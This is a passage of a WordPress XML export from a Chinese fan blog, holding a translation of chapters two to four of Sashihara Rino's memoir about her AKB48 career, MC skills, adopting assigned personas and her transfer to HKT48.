		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[304]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>「逆转力」– 指原莉乃著 – 第二章</title>
		<link>https://www.nervgeek.com/2016/02/03/%e3%80%8c%e9%80%86%e8%bd%ac%e5%8a%9b%e3%80%8d-%e6%8c%87%e5%8e%9f%e8%8e%89%e4%b9%83%e8%91%97-%e7%ac%ac%e4%ba%8c%e7%ab%a0/</link>
		<pubDate>Wed, 03 Feb 2016 13:41:58 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=853</guid>
		<description></description>
		<content:encoded><![CDATA[<strong><span style="font-size: 24pt;">第二章    发现只属于自己的武器</span></strong>
&nbsp;
在刚刚加入AKB48的1年间，我感觉这是一段为了可以寻找到自己的武器而渡过的时光。
在这一章，我想对大家聊一聊我自己自身找到武器，打磨武器的方法。
<strong>放弃[正统派]</strong>
作为AKB48研究生开始活动之后，马上就明白我没有能力成为正统派的偶像。
最初的时候有好好的作为目标哦？在大分的时代，一般一般的自信还是有的。那时我感觉自己长相的挺可爱。但是，在选拔阶段的时候，隐隐约约的注意到了哦。看看周围的女孩子，<strong>[东京，质量好高啊]</strong>。
从研究生升格成正式成员之后，便彻底的放弃了。并不只是形象的问题，我无论唱歌还是跳舞，还有姿态形象都无法做好。而且我在相当早的阶段开始便成为 <strong>[被欺负的角色]</strong>。 当然不是自己欺负自己，因为被周围人欺负，便顺其自然了哦。因为当时小组中间<strong> [被欺负角色]</strong> 的位置是空着的。所以我顺其自然滑入了这个位置，我感觉自己找到了生存的场所。既然已经变成这样，我只能尽力去说，努力去做好MC，我相信这是一个可以闪光的捷径。
与其说正统偶像的事情放弃的早，不如说是转换的快。早早的转换方向而剩下的时光，不就有时间去打磨属于自己的武器了吗。<!--more-->
<strong>鼓起勇气，经历许多失败</strong>
成员最经常问我的是，<strong>[做MC（主持人）一直顺畅交谈的秘诀是什么？]</strong> 我只能回答说，<strong>[说实话，是那个场合的节奏哦]</strong>。
想要去掌握节奏，怎么做才好呢。我认为除了经历更多的失败，没有别的办法。
只有在失败之中，捕捉属于自己的感觉。
48G很好的地方，是拥有自己的剧场。因为剧场公演是在<strong> [家]</strong> 里，多多少少的失败也会得到观众的原谅。
我想不如说是，快乐的看着我们把失败作为食粮而迎来成长的姿态。
所以，我对我的成员都做这样的建议。
<strong>[在剧场，我想严丝合缝地按照台本的构造去说并不好。也许是件可怕的事情，如果这样做的话太浪费了哦。一边确认粉丝内心评价，一边不怕失败的去说，这样做会更好。因为剧场是粉丝们帮助我们成长的地方]</strong>。
最初那时候，我也是经历了特别多的失败。但是，这些失败让我得到了成长。
<strong>从制作人学到的寻找武器的方法</strong>
在剧场的失败和真实感觉到成长的故事。
我最初所属的Team是在当时3个Team(A , K , B)中,平均年龄最小的Team B。拥有まゆゆ（渡边麻友）, ゆきりん（柏木由纪）王道偶像感觉的Team。
在B4th <strong>[アイドルの夜明け]</strong>公演（2009年2月8日~2010年4月16日）的时候。第一次得到了属于自己的位置。由这次公演开始，从前辈那里明确的得到了 <strong>[想要我做MC]</strong> 的指示。
同时粉丝那边也说 <strong>[指原在研究生公演的时候，明明那么能说，升格之后反而变得沉默了]</strong>，我感觉正巧让我鼓起了干劲。
那次B4th的故事。
AKB48G的综合制作人是秋元康先生。秋元先生不仅仅承担单曲，专辑制作，剧场公演的概念开始，乐曲的选择以及作词全部经手去做。
直到那个时候，我几乎没有能够见到他的机会。说实话，我完全不知道他是个怎样的人。
就是这个秋元先生，来观看了B4th的正式彩排。
在公演的时候，歌曲与歌曲之间的空隙是MC的时间。展示自己的角色，把自己想说的事情传达给粉丝，这是很重要的时间。我想MC可以用<strong> [笑]</strong> 提升舞台与观众席的一体感。
第九首曲目《愛しきナターシャ》是我和はー酱（片山阳加）还有たなみん（田名部生来）的个别曲目。原定歌曲结束之后，由我们3个人做MC的环节哦。正式彩排的时候，我喊道 <strong>[耶<del>所以说这次的MC是~]</strong>，正在这时，秋元先生阻止了我。
<strong>[这样的话没有趣哟，刚刚歌曲服装是摇滚风的，在这儿你们化身摇滚明星，做一个如迷你短剧的MC更好。决定小组的名字，相互之间绰号相称。请在正式演出之前排练好。] </strong>
哇~ 糟糕。
绝对会冷场~。
但是，也没有啰啰嗦嗦的时间，只能努力去做。3个人商量之后，决定了各自的绰号和<strong> [猎人小队]</strong> 组名。
正式演出开始，开场歌曲结束之后作为MC登场。简单互动之后，开始自我介绍 。
<strong>[只爱你一个人哦，我是榴莲指原]</strong> 超搞笑。
在此之后，根据秋元先生的建议，成为了给公演添加适当虚假情报的猎人小组。直到千秋乐<strong> [解散]</strong> 为止，慢慢培养了很多角色。来剧场的观众们也对我们非常的期待。多亏了这些，在每年冬天都要举办的歌曲点播中（由粉丝投票决定的48组合歌曲总选举）《愛しきナターシャ》获得过最高6位的好成绩。
本来想到会失败的，但却获得大成功。不要犹豫，做到最后。未知的结果随之而来！
秋元先生，真的很厉害。<strong>[制作人原来是这样的啊]</strong>，这也是最初萌生这种感觉的故事哦。
不要着急，把自己正在思考的事情，慢慢的说出来
关于MC，最近有一件事让我感觉自己的能力有所提高。AKB48国立竞技场演唱会（2014年3月）的事情。
因为需要出场的歌曲只有一首，所以演唱会前半，我在观众席上观看了哦，偶像的演唱会最喜欢了。
就这时候，突然演出家那边联系到我，<strong>[接下来的准备需要花些时间，能不能登上舞台做一个5分钟左右的小演说？]</strong>。
我明白此时后台正急急忙忙做着准备，我想这不是容许我询问回绝的状况。我一边回复道<strong> [我明白了]</strong> ，一边登上了舞台。
起身而行到登上最后台阶，在这10秒钟的时间里，我在思考笑点。
<strong>[怎么办，怎么办......]</strong> 边去想笑点边去做演说这样一定会不安。换一句话说，只要能决定一个好玩的笑点，这样至少不会给大家一个坏的印象。
那时我决定的笑点是成员岛田（晴香）最近变胖的故事。
<strong>[在观众席间看了2、3个小时，岛田真的是变胖了啊。]</strong>
她自己也在MC间说过这个问题，电视节目中也刚刚因为体重的事情被吐槽过，粉丝一定会有共鸣，我预想这不会有错。
总之，先决定这个事情作为笑点，之后在舞台上演说了刚刚想到的事情。
成功引起了粉丝的共鸣。
关于MC，我感觉还有一个可以提供的建议。不要慌张，把自己想到的事情以及想要传达给大家的事情慢慢的说，一边思考，一边演说。
万事开头难，但是只要习惯之后，谁都能做的到。
<strong>被称作武器的文字</strong>
我另外的一把武器，与MC有着亲密的关系。它是<strong> [文章]</strong> 。
2010年3月开始，我移籍至太田制作，那时接触到了艺人朋友。
刚刚进入太田的4月份开始，博客<strong> [指原品质]</strong> 发布。
说到这里，听到我移籍至太田制作的时候，好像许多粉丝感到吃惊。因为是阿酱（前田敦子）呀（大岛）优子酱所在的事务所。在粉丝中间也会认为这是 <strong>[演员路线成员会去的事务所啊]</strong> 。
但是，希望大家再仔细思考一下。
这里有鸵鸟俱乐部，有吉（弘行），土田（晃之），彦摩吕......我想这根本就是最符合我的事务所了。
完全是插播一个玩笑。所以说回到我的博客。
在大分的时候，自己曾经做过博客，也开通了モバメ（ 成员短信的手机包月套餐服务）。在写文章方面，我想我是擅长的哦。
做好自我介绍，上传了第一篇文章之后，突然得到了3000条的回复。
而且，说到我的粉丝们，非同寻常......在给我的回复中，出现了许多搞笑的留言哦。我把这些留言收集起来，在记事中给予回复，大家看到后反应愈渐热烈。
第二次上传博客的时候，秋元先生突然发短信说 <strong>[博客，很有趣。]</strong>。
真的很吃惊，更多是对秋元先生竟然知道我邮件地址的件事。
现在重新去读过去的博客，说真的我也不知道哪里有趣，总之被秋元先生表扬过的第二篇博文是这样子的。
<em>白葱与白色的我和这黑暗的深夜</em>
<em>2010-04-30 22:21:36</em>
<em>昨日，我走在路上。</em>
<em>一颗完整的白葱掉落下来了呀。</em>
<em>容我再陈述一遍。</em>
<em>一颗完整的白葱掉落下来了呀。</em>
<em>难道不可怕吗？</em>
<em>深夜的黑暗与葱的洁白无与伦比的对决。</em>
<em>我无能为力，我没能做些什么。</em>
<em>清晨，白葱已经不见踪影(。_。</em>
<em>啊啊，那颗白葱怎么样了。</em>
<em>他在哪里？</em>
<em>他和谁在一起？</em>
<em>脑海里全部都是那颗白葱。</em>
<em>哈？难道这就是...！爱情？！</em>
<em>17岁的我在星期5晚22点满脑子都是这件事。</em>
以这个博客为契机，慢慢可以和秋元先生进行短信交流了。<strong>[一天更新一次有些少，请多更新几篇]</strong>。<strong>[指原，对读者提出问题很有趣。像收音机电台主播那样，做一个专题怎么样？]</strong>。秋元先生得知我在电视节目中宣称想要得到博客点击率的第一名后回复我说<strong> [那1天内试着更新100次怎么样？]</strong> 。更新100次的计划真的开始实行了。
大概最初就是从这时候开始，粉丝们和秋元先生感觉我是<strong> [开心果]</strong> 。如果这么去想，我感觉所有的开始都是从博客起步。
不对，如果把小学5年级的时候开始接触2CH，开始书写评论想法作为开端，我能走到现在得益于2CH。
怎么说，我的武器好像都得益于网络。
可怕的结论出现了。
<strong>转换战场</strong>
48组合中有许许多多的成员，单凭这一点竞争就已经很激烈。
但是却看到许多后辈们，过渡拘泥与正统派偶像路线，使得许多孩子没办法表现自己的个性。
同样的战场，同样的规则，同样的武器，这样的战斗，难道不是眼睁睁看着自己失败吗。
所以，转换战场，不要在对方的主场战斗！能不能给些建议呢？
<strong>[不要过分的在意。不是那里]</strong>
在<strong> [那里]</strong> 失败了，只能去找寻其他的道路。
找寻一把属于自己的武器，去打磨完成，用这把武器去战斗，只有这样去做</del>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>853</wp:post_id>
		<wp:post_date><![CDATA[2016-02-03 21:41:58]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-02-03 13:41:58]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e3%80%8c%e9%80%86%e8%bd%ac%e5%8a%9b%e3%80%8d-%e6%8c%87%e5%8e%9f%e8%8e%89%e4%b9%83%e8%91%97-%e7%ac%ac%e4%ba%8c%e7%ab%a0]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="akb"><![CDATA[akb]]></category>
		<category domain="post_tag" nicename="akb48"><![CDATA[akb48]]></category>
		<category domain="post_tag" nicename="akb48g"><![CDATA[akb48g]]></category>
		<category domain="post_tag" nicename="akb48group"><![CDATA[akb48group]]></category>
		<category domain="post_tag" nicename="akbg"><![CDATA[akbg]]></category>
		<category domain="post_tag" nicename="hkt48"><![CDATA[HKT48]]></category>
		<category domain="category" nicename="%e4%b9%a6%e7%b1%8d"><![CDATA[书籍]]></category>
		<category domain="post_tag" nicename="%e6%8c%87%e5%8e%9f%e8%8e%89%e4%b9%83"><![CDATA[指原莉乃]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="post_tag" nicename="%e9%80%86%e8%bd%ac%e5%8a%9b"><![CDATA[逆转力]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[201]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>「逆转力」– 指原莉乃著 – 第三章</title>
		<link>https://www.nervgeek.com/2016/02/03/%e3%80%8c%e9%80%86%e8%bd%ac%e5%8a%9b%e3%80%8d-%e6%8c%87%e5%8e%9f%e8%8e%89%e4%b9%83%e8%91%97-%e7%ac%ac%e4%b8%89%e7%ab%a0/</link>
		<pubDate>Wed, 03 Feb 2016 13:58:38 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=855</guid>
		<description></description>
		<content:encoded><![CDATA[<strong><span style="font-size: 24pt;">第三章    不要否定被抛来的角色而是接纳她</span></strong>
&nbsp;
指原莉乃......听到这个名字，大家的脑海中会浮现怎样的印象呢。
果然还是<strong> [废柴]</strong> 啊。
这可不是我自己选择的角色哦，不知不觉间变成了这样一个角色。其实在这里，也有逆转的故事。让我从头开始讲述。<!--more-->
<strong>蹦极危机</strong>
在我陷入的危机中，综艺节目中蹦极挑战的糟糕程度可以能进入前5名。（东京电视《周刊AKB]》2009年9月25日放送<strong>[第一回试胆大会女王选手权]</strong>）。
42米高桥上一跃而下的蹦极挑战。
前辈ともちん酱（板野友美）とも～み酱（河西智美），同期生（仁藤）萌乃都在我面前挑战成功。我第四个出场。
完全做不到，没能飞起来。
感觉真糟糕哦。这下坏了。当时本来就因为总选举没能进入选拔组，从而处境变的糟糕。这之后的处境会更加危险。
并不是因为重度的恐高症哦，当然在高高的地方会有害怕的心情，但也不是绝对不可以而失去意识的程度。
但是，没能飞起，我不想靠近死亡！
我想如果是过山车的话不会有问题的，坐在车上的时间里，不都是自动运行的吗。但是蹦极不同，不得不亲自起跳，这让我无法克服。
可是，并不代表距离死亡又近了一步啊。不去蹦极的话，死亡的可能性明明是0，但是做了，死亡的可能性不是增加了百分之零点几吗。那我为什么一定要去做啊。
我，绝对不想死。<strong>[不想死！]</strong> 想一心活下去，这才是我啊。心里只想着这些。我想要得到最美的幸福啊。在播放室表达了<strong> [再次挑战！！]</strong> 的宣言后。通过工作人员的帮助，很快启动新一次的拍摄活动。并在池谷幸雄先生的体操课堂中进行了很多次练习之后，于よみうりランド（游乐园名）再度蹦极挑战。22米高哟。
游乐园普通的娱乐设施哦？
没能成功。果然，我还是不想靠近死亡。
<strong>[废柴] 机遇</strong>
蹦极失败的节目播放之后，周围的人开始称我为<strong> [废柴]</strong> 。
废柴，最初我不认为这是坏话哦。就如称麻友友（渡边麻友）<strong>[CG]</strong> 一样，我是以这种心情接受了它。
我想是不是给我赋予了这么一个角色呢。
就算后来知道这是蔑称，但我并没有高傲的自尊心，我反而感觉这挺有趣，并没有哪里不好的。
两年之后，秋元先生对我说，<strong>[有很多的粉丝都是支持指原废柴的地方，脆弱的地方哦]</strong> 。
<strong>[啊，原来是这样啊，lucky ！]</strong>
关于废柴，我只是顺应了周围大家的看法。
能说一说真实的想法吗？当时我感觉，<strong>[我不是那么废柴的不是吗？] </strong>。
开始被称为废柴的契机，自然是蹦极失败的故事，但原本我没有害怕周围工作人员的目光而放弃挑战的那一刻，是不是不那么废柴呢。不如说，我有强大的内心。而且，我宣言再度挑战之后，辜负大人们尽心的准备还是没能跳下去的时候，真强。
不过，正是这个时候由拒绝蹦极的危机之中，诞生出废柴角色的机遇，这一点不会有错。
多亏了赋予我这个角色，并且广为人知，围绕自己的境况也慢慢发生了变化。
角色不是去创作，而是被赋予
为了能在集团中创造自己的生存场所，能够引人注目，我想给予自己一个角色非常重要。是不是在这一点上许多人都有着烦恼。
关于角色，我有自己独到的见解。
角色不是自己创造，而是被赋予的。
我建议最好能够避免自己开始就决定<strong> [我要做这样一个角色]</strong> 。
如果拘泥于自己设定好的角色，那么游离于集团之外的危险性非常高。
固执己见宣称<strong> [我是一个这样的人]</strong> ，也许不能让人信服。自己一个人的传达力自然是非常弱小。
首先让周围人认可你的角色，感觉到有趣，我想之后可以去渗透这个角色。
最初不妨把自己设定为<strong> [没有什么特别的人]</strong> 会好一些哦。之后静静等待由周围传来的声音 <strong>[你是这么一个角色啊]</strong>，顺应这个角色，难得被周围人们赋予的东西，最好不要去否定它。
只是，不要勉强自己，自己能够贯通的角色最为理想。稍微尝试自己可不可以去成为这个角色，如果感觉厌恶，我想还是转变角色更好。
比如，像みるきー（渡边美优纪），我想如果能被确立一个角色，就算装纯角色也完全OK的哦。
但是，半途而废的装纯角色，在女子团里中想必是 <strong>[痛苦]</strong> 的。
别人赋予的角色，要看透是不是符合于自己，自己好好的思考一下会更好。
如果犹豫去做还是不做， 去做
经常会产生比如<strong> [因为这不是我的角色啊]</strong> 这样的想法吧。类似于这样的感觉我从未有过哦。
比如综艺节目中，突然被要求 <strong>[请做一个模仿秀]</strong> 。不管怎么都去做。根据那个场合的节奏，适当的。
我完全不会因为这些感觉害羞。
在这一点上，会感觉我自尊心水平线太低吧。趴在地面的自尊心。地平线自尊心。
但是我想，自尊心太弱也挺好的。
容易害羞的人，不是被看一看就会害羞么。当你害羞的时候，就会冷场。
被甩过来黄段子也没有什么好难为情的。如果说<strong> [因为说这些会难为情，所以请不要说了]</strong> ，谈话会被终止哦。我想这里没有必要由自己率先改变谈话。<strong>[不要说奇怪的东西哦~]</strong> 比如回答这样程度的话语之后，交谈也不会被终止。
丢弃掉高傲的自尊心，我想会让你得到很多很多。<strong> [为什么我要做这些事。不想去做哟]</strong> 我想虽然类似这样的工作会有很多。是去做还是不做，我的建议是做。
<strong>[我的话一定不行的哦]</strong> 就算被要求做这样的事情，去做绝对要比不做好。犹豫<strong> [怎么办哟]</strong> 根本就是浪费时间。尽量压缩犹豫的时间。
实际去做的时候，虽然会出现<strong> [完全没有意义啊]</strong> 的想法，也会有 <strong>[什么啊，现在的工作]</strong> 这种情绪。
<strong>[那也比什么都不做要好]</strong> 。
做了那个工作之后自己的评价下降，和没有做这个工作自己的评价下降。如果评价这两者哪一个更坏更糟糕。难道不是什么都没有做就下降了吗。难为情啊，有没有意义啊，能不能完成啊，犹豫在这之中是大家的自由。但是，是做还是不做之中选一个，我肯定去做。
<strong>从被欺负中树立角色</strong>
角色话题的结局，也许是自尊心的话题。[因为我不是那样的角色] 这么说的人有着非常高傲的自尊心吧。我原本也感觉自己好可爱，也许过去同样有着高傲的自尊心。曾经也许想过 如果颜美，<strong>[单纯脸蛋漂亮也不错啊]</strong>。但是没有一个属于自己的角色，单纯是一位文静的美人，那么并没有什么意义。
放低自己的自尊心，绝对会有所收获。
比如，平胸这件事情，对于我来说是自卑感的其中之一。也许别人会想<strong> [好可伶啊]</strong> 。但是无力改变。
既然如此，自己把胸小作话题，使它向着<strong> [有趣]</strong> 的方向发展不是更好吗。比起遮遮掩掩，落落大方的把这件事说出去不是会更好吗。
自己自卑的地方，因为总想着<strong> [难为情啊] </strong>，我想这样肯定会在不经意间受到伤害。所以，丢弃掉<strong> [难为情]</strong> 的心情。怎么说我非常淡定若无其事，意外的拥有一种美国风。
关于丑女的梗也是同样，在我的大分时光中，我感觉自己还算一般可爱。但是到了东京之后完全不同了。
在被别人评价之前。我记得自己曾这么评价过自己。在2CH很早就这么说过。
前面刚刚说过，单纯的长相漂亮也没什么意义，那毫无亲近感的丑女，我想真是最糟糕了。
我如果对周围的大家说<strong> [请不要叫我丑女！]</strong> ，<strong>[唔，当然可以了，其他也没什么可以说的哦。]</strong> 之后有可能会对我小心谨慎不是吗。
但是，如果我说<strong> [丑女也OK的！]</strong>，可能会被取笑。
但虽然被取笑了，我可以通过这个形式前进。在周围人的取笑中，我得以树立了自己的角色。我可以在这个世界中展现出一个名叫做指原的女孩。
我本来就是没有什么高傲自尊心的人，被欺负也没什么大不了的，但是，我想厌恶被欺负的人会很多很多。
也许会感觉心酸，那个时候，只有去忍耐，为了自己的未来。
如果感觉自己一个人的力量也足够成功，那么我想不去忍耐来自周围的欺负也毫无问题。但是如果自己一个人的力量不足以成功，那么能有可以依靠地方依靠会更好。
所以说就算自己并不是那么有趣人，周围的人会把自己变的有趣哦？
<strong>用欺负消除隔阂</strong>
也许稍稍会成为废话， 欺负人，也有可以展现出关系好的优点。今年4月开始，SKE48的（木本）花音确定了兼任HKT48的事情。
在兼任活动开始的演唱会（[AKB48グル―プ春コンin さいたまスーパーアリーナ～思い出は全部ここに捨てていけ～]）最初MC中，我把花音介绍给大家的时候，顺带突然的取笑了她的下巴。
<strong>[我希望SKE48的粉丝们不要生气，但拿下巴开玩笑没有问题吗？]</strong> 感觉挺好的戳中要点了哦。
花音回答<strong> [没关系哦！]</strong> 那一瞬间，我感觉我们成员之间的隔阂全部都消失了，而且我想HKT48的粉丝们也能够接受她。
SKE48人气成员的加入，也许自己支持的成员序列会改变，但我想也会有反而更支持自己偶像的粉丝。
比起像贵宾公主一样去对待，不如用能欺负的伙伴来表现。这对于HKT48是有利的，对于花音同样有利，对于粉丝的大家也同样。
其实，在演唱会之前如此问过花音<strong>，[拿下巴开个玩笑可以吗？]</strong> 。得到<strong> [完全没问题哦]</strong> 回答之后，演唱会时开了这个玩笑。嘛，除了 <strong>[没关系哦]</strong> 的回答之外也没其他可说了哈。
<strong>别人发掘出 [自己]</strong>
果然不是废话，关于欺负的话题，在稍微说一点。我所属的HKT48也会参与电视节目录制。
2014年7月现在的冠名节目有 《HKT48的おでかけ！》(TBS)、《HKTバラエティー48》（九州朝日放送）、《HKT48のごぼてん！》（西日本电视）、《HKTシャカリキ48！》（九州朝日放送）、《HKT48の「ほかみな」～そのほかのみなさん～》 (NOTTV)。
在电视节目中，我做MC的机会会有很多。这是我作为MC后渐渐感觉强烈的事情。根据MC的想法去行动，我想这样做对于那个孩子是有利的，对于节目本身也是有利的。说起来虽然残酷，但是现实就是如此。
在电视节目中，狠狠的被赋予了一个角色，既可以把这个角色带回剧场，自然也可以将这个角色作为武器在娱乐圈战斗。
MC赋予你这个角色不就是在告诉你<strong> [你在这方面有趣哦]</strong> 。拒绝这些难以顺畅前行。
真正的自己是不存在的哦。
本质的自己什么的，不存在。
<strong>[自己]</strong>，我想是别人帮助发现而来的。这些是我沿着很多很多经验最后得到的。这是我的结论。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>855</wp:post_id>
		<wp:post_date><![CDATA[2016-02-03 21:58:38]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-02-03 13:58:38]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e3%80%8c%e9%80%86%e8%bd%ac%e5%8a%9b%e3%80%8d-%e6%8c%87%e5%8e%9f%e8%8e%89%e4%b9%83%e8%91%97-%e7%ac%ac%e4%b8%89%e7%ab%a0]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="akb"><![CDATA[akb]]></category>
		<category domain="post_tag" nicename="akb48"><![CDATA[akb48]]></category>
		<category domain="post_tag" nicename="akb48g"><![CDATA[akb48g]]></category>
		<category domain="post_tag" nicename="akb48group"><![CDATA[akb48group]]></category>
		<category domain="post_tag" nicename="akbg"><![CDATA[akbg]]></category>
		<category domain="post_tag" nicename="hkt48"><![CDATA[HKT48]]></category>
		<category domain="category" nicename="%e4%b9%a6%e7%b1%8d"><![CDATA[书籍]]></category>
		<category domain="post_tag" nicename="%e6%8c%87%e5%8e%9f%e8%8e%89%e4%b9%83"><![CDATA[指原莉乃]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="post_tag" nicename="%e9%80%86%e8%bd%ac%e5%8a%9b"><![CDATA[逆转力]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[269]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>「逆转力」– 指原莉乃著 – 第四章</title>
		<link>https://www.nervgeek.com/2016/02/03/%e3%80%8c%e9%80%86%e8%bd%ac%e5%8a%9b%e3%80%8d-%e6%8c%87%e5%8e%9f%e8%8e%89%e4%b9%83%e8%91%97-%e7%ac%ac%e5%9b%9b%e7%ab%a0/</link>
		<pubDate>Wed, 03 Feb 2016 14:22:49 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=860</guid>
		<description></description>
		<content:encoded><![CDATA[<strong><span style="font-size: 24pt;">第四章    人生最大危机与逆转的思考法</span></strong>
&nbsp;
由粉丝的投票决定下一张CD的成员。根据偶像组合的成员的人气赋予排名次序——选拔总选举。时至今日，与其说已经被成员与粉丝所接受，我想我已经习惯了这些，2009年开始每年举办一次的 <strong>[选拔总选举]</strong> 活动着实残酷，秋元先生，实在是史无前例。
感谢大家，多亏大家的支持，第一次总选举之后排名一直上升。
2009年，27位。2010年，19位。2011年，9位......。
最初PV演出的时候，只出现了2.5秒就不见了，处于 <strong>[寻找指原]</strong> 的状态，因为总选举的排名慢慢上升，渐渐有1分钟左右的出镜机会。而且，2012年第四回总选举中得到了第四位的排名。6万7339票，真的真的难以置信。
但是。
第四回总选举举行的那一天是6月6日。10天之后，我移籍HKT48的事情被决定下来。
在这一章，请允许我讲述关于我人生至今为止最大的危机。<!--more-->
<strong>打算由AKB48辞职</strong>
得知某周刊杂志（文春周刊）发表了关于我绯闻的事情，是在《笑っていいとも！》 生放送的一个周一。
48组合中有一条名为<strong> [恋爱禁止]</strong> 的规则 。有记事刊登出我在研究生时期破坏了这条规定......
眼前一片漆黑。
那一天的夜晚是AKB48全国巡演，千叶站演唱会。当然我没有缺席，尽力去做好演出，但是眼泪无法抑制。
因为我想我再也没有机会与眼前的大家一起站在舞台上了。
破坏了规矩，并被发现确凿证据的情况下，根据运营方的判断进行处罚。
禁闭，降格为研究生，活动辞退。
对于我，我想由AKB48这辞职。不仅对支持AKB48的粉丝感到由衷的歉意，同时也给成员的大家添了太多的麻烦。
我把我的想法也告诉了秋元先生，之后得到回复，
<strong>[知道了，除了真心想对娱乐界倾注感情的人之外，不用留在这里。]</strong>
听了这些话，总算能够终止我一直向着消极方面前进的思想。而且比起那么多支持AKB48的粉丝们的心情，我更设身处地去思考像我一样的粉丝们的感受，思考我选择继续下去的意义。
记事发表之后，毫无疑问粉丝们会担心我。而我却突然的从AKB48毕业，从娱乐圈隐退，没有比这更悲伤的事情。
这时龟井绘里酱的事情从脑海中闪过。我一直喜欢着龟井酱，而她突然由早安少女毕业，(2010年12月）同时从娱乐圈隐退。我感觉人生结束了，对我来说是如此一般的打击。
但是，龟井酱是因为身体原因没有办法才毕业的哦。而我，只是因为只是因为一篇记事。就这么毕业，隐退，这样绝对不好。
凭借粉丝们的力量，总选举得到了第四名的成绩，但新歌还有没发行，第四位置上歌唱的姿态还没能让粉丝们看到。如果是我，我想看。
如果是我，我想要留下。
第二天，我将想法传达给秋元先生。
<strong>[果然，我想在AKB48继续努力。]</strong>
<strong>突然的HKT48移籍</strong>
无视周4发刊登绯闻的杂志，如同往常一样继续工作。
但是，在这前一天的夜晚，好像注意到我的状况不太好的咪酱（峯岸南）和たかみなさん（高桥南）邀请我一起吃饭。
聊完周刊志的事情，在KTV为了我举办励志会，为我唱了如 《負けないで》 等等许多励志歌曲。足足唱了3个小时。果然AKB48最完美了，我想要留在这里......
那个星期的周五，我得到了 <strong>[オールナイトニッポン]</strong> 生出演的安排，原本是秋元先生出演预定，这次也叫上了我。
在节目的开始，我先亲口就周刊志的事情对粉丝的大家道歉，接受道歉之后，秋元先生说到。
<strong>[你明天将成为HKT48的指原莉乃]</strong>
......一时难以理解。
AKB48在国内拥有3支姐妹组合。名古屋·荣为据点的SKE48 (2008年秋天活动开始)，大阪·难波作为据点的NMB48（2010年秋天活动开始)，还有福冈·博多作为据点的HKT48（2011年秋活动开始)。作为48G的‘小女儿’HKT48在当时只有1期成员，也没能发行歌曲。因为和AKB48的交流非常的稀少，几乎不知道所有成员的名字。不只是我，其他的成员，粉丝我想大家都是同样的状态。在那个组合中虽然只有19岁但已是年龄最大的我，移籍的事情被决定下来。
秋元先生对我说 <strong>[去做出自己的贡献吧]</strong> 。
